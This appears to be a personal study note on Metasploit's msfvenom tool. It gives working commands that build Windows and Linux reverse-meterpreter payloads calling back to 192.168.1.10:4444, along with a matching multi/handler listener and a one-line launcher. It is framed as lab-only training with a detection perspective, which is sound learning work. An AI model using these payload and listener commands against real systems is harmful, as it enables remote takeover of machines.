---
tags: [cyber, module1, metasploit]
jqr: "Module 1: generate standalone payloads with msfvenom and catch them with exploit/multi/handler"
---

# MSFvenom

`msfvenom` is Metasploit's standalone payload generator. It builds a payload **file** (exe, elf, script, shellcode) that I deliver some other way and then catch with a handler. Basically the "make me a reverse shell" tool.

Lab only: I fire these payloads at my own VMs and CTF targets, nothing else. Haven't run them in the study sandbox (no live MSF output there), so the syntax is doc-checked but I still need to confirm it on my box.

## Quick version

```bash
# Windows x64 reverse-meterpreter as an .exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# Linux x64 reverse-meterpreter as an ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp   LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf

msfvenom --list payloads     # discover payloads (also: --list formats, --list encoders)
```
Then catch it. The handler's payload/LHOST/LPORT have to match the build exactly:
```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10 ; set LPORT 4444 ; run
```

## What it's for

I think of `msfvenom` as a stamping press for payloads: feed it a payload type (`-p`), an output format (`-f`), and my callback address (`LHOST`/`LPORT`), and it presses out one self-contained file that phones home the moment it runs.

An exploit is only half the job. It gets code execution, but *what runs* is the payload. Sometimes I don't have a memory-corruption exploit at all and just need to get a file onto a box (phishing lab, a writable share, a file-upload CTF) and have it call home. `msfvenom` builds exactly that file. It's the merged successor of the old `msfpayload` + `msfencode`.

The payload and the handler are two ends of one wire: I build with `msfvenom` and listen with `multi/handler`. If the payload type, LHOST, or LPORT differ between the two, the shell never completes.

> Why they have to match exactly: `LHOST`/`LPORT` aren't values the target discovers at runtime. They're baked *into* the payload file when I build it, so the exe literally carries my IP and port inside it. The handler isn't negotiating, it's keeping a hard-coded appointment. Same logic for a staged payload's type: the stub and the handler have to agree on what stage two looks like or it never assembles. For the callback mechanics of reverse vs bind and staged vs stageless, see [Meterpreter](Meterpreter.md).

## Generate a payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
```
That builds a Windows 64-bit staged reverse-meterpreter and writes it to `shell.exe`. `LHOST`/`LPORT` mean the same thing here as in msfconsole (my callback address).

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf
```
Same idea for a Linux target, just output as an ELF binary.

**Flag decoder:**

| Flag | Meaning |
|---|---|
| `-p` | payload to generate (`-p -` reads a custom payload from stdin) |
| `LHOST=` / `LPORT=` | callback IP/port (payload options, `KEY=value` style) |
| `-f` | output **format** (see below) |
| `-o` | output file |
| `-e` | encoder (e.g. `x86/shikata_ga_nai`); historically for **bad-char avoidance** |
| `-b` | bad characters to avoid, e.g. `-b '\x00\x0a'` |
| `-i` | encoder iterations |

## Formats and discovery

```bash
msfvenom --list payloads     # every payload
msfvenom --list formats      # every output format
msfvenom --list encoders     # every encoder
```
Common `-f` formats I reach for: `exe`, `elf`, `raw`, `dll`, `psh` (PowerShell), `python`, `war` (Java/Tomcat), `asp`, `jsp`. Pick the one the target will actually execute.

> [!warning] Scope note: no AV/EDR evasion here
> Encoders (`-e`) exist for **bad-character avoidance / encoding**, *not* reliable AV evasion. Modern AV/EDR catches stock payloads anyway. AV/EDR evasion is **out of scope** for these notes, and I keep everything to my own lab VMs.

> Blue-side view, which is where I'm coming from: stock payloads are easy to catch because the *behaviour* is loud, not because the bytes are recognisable. A freshly-written binary that immediately opens an outbound connection to a high port is a classic detection heuristic no matter how it's encoded. That's the more useful (and more honest) thing to internalise than chasing evasion.

## Catch it with a handler

`exploit/multi/handler` is the generic listener that catches any payload. Its settings have to be identical to what I built.

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run                # or: exploit -j  to background the listener
```
On connect I get `Meterpreter session 1 opened`. `exploit -j` frees the console so I can keep working, see [Metasploit Workflow](Metasploit%20Workflow.md) for job/session management.

One-line launcher (handy when the exam clock is running):

```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.10; set LPORT 4444; run"
```
For a *plain* (non-meterpreter) shell payload I can also catch it with a raw [Netcat](../../Recon%20Tools/Netcat.md) listener instead of a handler, but then I lose all the meterpreter verbs.

## Stuff that trips me up

- The handler has to match the build byte-for-byte: same payload string, same LHOST, same LPORT. A staged payload with a mismatched handler hangs mid-stage.
- `-f` picks the wrapper, `-p` picks the payload, and I keep mixing those two up. `--list formats` saves me under time pressure.
- LHOST is *my* IP, not the target's. On a VPN CTF that's the `tun0` address.
- Meterpreter vs shell payload: `.../meterpreter/...` is the rich in-memory agent, `.../shell/...` is a raw cmd/bash shell. I pick meterpreter unless I specifically need something tiny and simple.
- Staged (`/`) vs stageless (`_`) in the payload name changes the callback. Details are in [Meterpreter](Meterpreter.md).
- Encoders are *not* evasion. I don't rely on `-e` to get past AV.

## Sources

- msfvenom (Metasploit Unleashed): https://www.offsec.com/metasploit-unleashed/msfvenom/
- Metasploit Framework documentation (home): https://docs.metasploit.com/
- metasploit-framework package (ships msfvenom): https://www.kali.org/tools/metasploit-framework/
- `multi/handler` module (Rapid7 DB): https://www.rapid7.com/db/modules/exploit/multi/handler/

## See also

- [Metasploit Workflow](Metasploit%20Workflow.md)
- [Meterpreter](Meterpreter.md)
- [Netcat](../../Recon%20Tools/Netcat.md)
- [Windows CLI and net Commands](../../Win%20Admin/Windows%20CLI%20and%20net%20Commands.md)
